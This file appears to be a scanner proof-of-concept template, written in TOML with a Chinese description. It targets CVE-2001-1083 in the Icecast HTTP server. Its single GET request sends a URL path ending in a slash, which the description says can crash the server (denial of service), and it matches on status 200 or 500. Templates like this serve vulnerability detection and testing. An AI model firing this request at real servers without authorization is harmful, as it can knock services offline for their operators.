[info]
author = "ave"
description = "向Icecast HTTP服务器发送以斜杠、反斜杠或点号结尾的恶意URL路径，触发拒绝服务崩溃"
id = "POC-AVE-2001-0367"
name = "CVE-2001-1083 PoC"
severity = "high"
tags = ["ave-2001-0367"]
vuln_id = [
    "CVE-2001-1083",
    "AVE-2001-0367",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    500,
]
type = "status"
